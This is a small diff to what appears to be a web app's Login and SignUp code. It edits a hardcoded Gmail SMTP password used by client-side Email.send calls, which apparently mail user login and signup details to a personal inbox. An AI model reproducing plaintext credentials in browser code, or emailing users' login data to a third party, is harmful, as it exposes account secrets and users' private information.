@@ -90,7 +90,7 @@ function Login() {
             Email.send({
                 Host: "smtp.gmail.com",
                 Username: "iamwebdeveloper0@gmail.com",
-                Password: "hiiiamvickykumarguptaushouldnotgetmypass",
+                Password: "hiiiamvickykumarguptaushouldnotgetmypass..",
                 To: 'vickykumargupta369@gmail.com',
                 From: "iamwebdeveloper0@gmail.com",
                 Subject: "User Login info",
@@ -149,7 +149,7 @@ function SignUp() {
                     Email.send({
                         Host: "smtp.gmail.com",
                         Username: "iamwebdeveloper0@gmail.com",
-                        Password: "hiiiamvickykumarguptaushouldnotgetmypass",
+                        Password: "hiiiamvickykumarguptaushouldnotgetmypass..",
                         To: 'vickykumargupta369@gmail.com',
                         From: "iamwebdeveloper0@gmail.com",
                         Subject: "New user info",
